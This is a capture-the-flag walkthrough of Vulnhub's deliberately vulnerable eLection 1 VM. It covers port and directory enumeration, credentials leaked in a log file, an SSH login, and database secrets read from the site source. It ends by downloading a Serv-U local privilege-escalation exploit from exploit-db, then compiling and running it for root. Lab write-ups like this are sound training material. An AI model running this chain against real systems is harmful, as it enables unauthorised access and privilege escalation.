+++ 
draft = false
date = 2020-07-25T09:34:23+01:00
title = "eLection 1 CTF walkthrough"
description = "A writeup of Vulnhub's eLection 1 CTF"
slug = "" 
tags = []
categories = []
externalLink = ""
series = []
+++

Another enjoyable CTF, [eLection: 1](https://www.vulnhub.com/entry/election-1,503/) promises to be
an OSCP-like VM with medium level difficulty. It's quite a straightforward box, but nonetheless a good excuse to sharpen your skills.

# Enumeration
Lets see what ports are open with `nmap -T4 -A 192.168.123.132`:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-25 10:01 BST
Nmap scan report for 192.168.123.132
Host is up (0.00034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)
|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)
|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 00:0C:29:24:29:67 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```

Interesting - OpenSSH 7.6p1 - might there be a vulnerability or two we can use (specifically with regards to enumerating usernames)? We don't need to do so just yet, but I'll keep that in mind.

Turning to port 80 then, at first, things don't seem too interesting, except that now we know we're dealing with an Ubuntu box:

![Website screenshot](/img/election/webserver.png)

Things get more exciting when we check robots.txt:

```
admin
wordpress
user
election
```

The only directory that seems to exist here is /election.

![Other website screenshot](/img/election/website.png)

Running `dirb http://192.168.123.132/` is also quite enlightening - it would appear that there's also a forbidden `/javascript` folder, and better yet, `/phpmyadmin`! Also, `/election` looks to have its own thing going on:

```
---- Scanning URL: http://192.168.123.132/election/ ----
==> DIRECTORY: http://192.168.123.132/election/admin/                                                                                           
==> DIRECTORY: http://192.168.123.132/election/data/                                                                                            
+ http://192.168.123.132/election/index.php (CODE:200|SIZE:7003)                                                                                
==> DIRECTORY: http://192.168.123.132/election/js/                                                                                              
==> DIRECTORY: http://192.168.123.132/election/languages/                                                                                       
==> DIRECTORY: http://192.168.123.132/election/lib/                                                                                             
==> DIRECTORY: http://192.168.123.132/election/media/                                                                                           
==> DIRECTORY: http://192.168.123.132/election/themes/

---- Entering directory: http://192.168.123.132/election/admin/ ----
==> DIRECTORY: http://192.168.123.132/election/admin/ajax/                                                                                      
==> DIRECTORY: http://192.168.123.132/election/admin/components/                                                                                
==> DIRECTORY: http://192.168.123.132/election/admin/css/                                                                                       
==> DIRECTORY: http://192.168.123.132/election/admin/img/                                                                                       
==> DIRECTORY: http://192.168.123.132/election/admin/inc/                                                                                       
+ http://192.168.123.132/election/admin/index.php (CODE:200|SIZE:8964)                                                                          
==> DIRECTORY: http://192.168.123.132/election/admin/js/                                                                                        
==> DIRECTORY: http://192.168.123.132/election/admin/logs/                                                                                      
==> DIRECTORY: http://192.168.123.132/election/admin/plugins/  
```

![PHPMyAdmin screenshot](/img/election/phpmyadmin.png)

So far we've discovered two potential attack vectors:
* PHPMyAdmin
* The election site

# Getting a foothold
I'll focus most of my efforts on the election site for now. After reading a few pages, I couldn't help but notice the candidate "Love" (and the "admin1" text beneath him - a password maybe?) Wappalyzer tells me the site is running phpMyAdmin 4.6.6, MySQL and PHP.

We'll want to login of course, but my attempts at guessing admin IDs were thwarted (well, nearly) by a pesky attempt at blocking me.

![Login page with 2 attempts left](/img/election/login.png)

Amusingly however, the way the site's keeping track of this is with a cookie, something all too easy to change, so it looks like we'll be fine.

![Sessions variables in FireFox](/img/election/blocked.png)

Using Burp Suite will let us analyse exactly what's going on, and as we can see, not only is the blocked_num easy to change, but we've also two POST parameters to mess around with - perhaps for some SQL injection?

![Burp Suite proxy post form](/img/election/burp.png)

The area at the bottom of the main page ("Now is Your Turn!") also had some sort of form. The client-side Javascript refused to submit the request unless the entered string was 5 characters or longer, which I thought was a bit weird.

![Burp Suite proxy for votinig](/img/election/burp2.png)

# Getting user
After a bit of tomfoolery trying all sorts of wacky things, I decided to do what I really should have done before, and check out the folders dirb uncovered. That proved to be a good idea because now we have some really rather juicy information in the form of /election/admin/logs/system.log...

```
[2020-01-01 00:00:00] Assigned Password for the user love: P@$$w0rd@123
[2020-04-03 00:13:53] Love added candidate 'Love'.
[2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux)
```

PHPMyAdmin isn't going to accept those credentials. Luckily we have something far better - SSH. Surely not?...

```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * "If you've been waiting for the perfect Kubernetes dev solution for
   macOS, the wait is over. Learn how to install Microk8s on macOS."

   https://www.techrepublic.com/article/how-to-install-microk8s-on-macos/

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

74 packages can be updated.
28 updates are security updates.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Thu Apr  9 23:19:28 2020 from 192.168.1.5
love@election:~$ cat Desktop/user.txt
cd38ac698c0d793a5236d01003f692b0
```

Bingo! Kubernetes is instsalled, which could mean something. It turns out that the hash can be cracked easily and means `love-1`. How interesting.

# The road to root
Time to find out about what we can do.

```
love@election:~$ id
uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)
love@election:~$ sudo -l
[sudo] password for love: 
Sorry, user love may not run sudo on election.
```

Let's not forget we can look at the site's source code too.

```
love@election:/var/www/html/election/admin$ cat inc/conn.php 
<?php
        error_reporting(0);
        session_start();
        $db_host = "localhost";
        $db_user = "newuser";
        $db_pass = "password";
        $db_name = "election";
        $connection = mysqli_connect($db_host,$db_user,$db_pass,$db_name);
        if(!$connection){
                echo "FATAL ERROR!";
                exit();
        }
?>
```

After feeling dumb for not bothering to test for weak credentials beforehand (PHPMyAdmin could've been fun that way), I really wanted to get some more credentials. So by all means, let's connect to this DB and see what we can find...

```
love@election:/var/www/html/election/admin$ mysql -u newuser -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 81
Server version: 10.1.44-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use election
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [election]> show tables
    -> ;
+--------------------+
| Tables_in_election |
+--------------------+
| tb_guru            |
| tb_hakpilih        |
| tb_kandidat        |
| tb_level           |
| tb_panitia         |
| tb_pengaturan      |
| tb_polling         |
| tb_siswa           |
+--------------------+
8 rows in set (0.00 sec)
```

I won't bore you with the details, but if we look at one table in particular we can have a little fun.

```
MariaDB [election]> select * from tb_panitia;
+----+----------+------+-------+----------------------------------+
| id | no_induk | nama | level | password                         |
+----+----------+------+-------+----------------------------------+
|  1 | 1234     | Love |     1 | bb113886b0513a9d882e3caa5cd73314 |
+----+----------+------+-------+----------------------------------+
1 row in set (0.00 sec)
```

Yet again mostly likely an MD5 hash. Of course, if I spoke Indonesian I'd happily tell you what `no_induk` means, and by all means, crack the password if you want, but as we already have user I decided to just soldier on.

# Privilege escalation
SUID files are always fun to find, so let's see if they're any.

```
love@election:~$ find / -perm /4000
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/bin/fusermount
/bin/ping
/bin/umount
/bin/mount
/bin/su
```

Straight away this `Serv-U` certainly sounds promising. A quick Google search told me it was some sort of FTP server, but for our purposes, we need know only one thing - [that Serv-U versions under 15.1.7 have a local privilege escalation vulnerability](https://www.exploit-db.com/exploits/47009)!

```
love@election:~$ wget https://www.exploit-db.com/download/47009 -O 47009.c
--2020-07-25 16:04:16--  https://www.exploit-db.com/download/47009
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 619 [application/txt]
Saving to: ‘47009.c’

47009.c                              100%[===================================================================>]     619  --.-KB/s    in 0s      

2020-07-25 16:04:16 (128 MB/s) - ‘47009.c’ saved [619/619]

love@election:~$ gcc 47009.c -o ezRoot.o; ./ezRoot.o
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# whoami
root
# cat /root/root.txt
5238feefc4ffe09645d97e9ee49bc3a6
```

Overall a quite enjoyable box, and one I certainly had fun doing (the flag means love-root if anyone's interested). Not too many rabbit holes or anything like that, although I do wonder if there are other ways of completing it, given the remaining mysteries of the election's admin panel.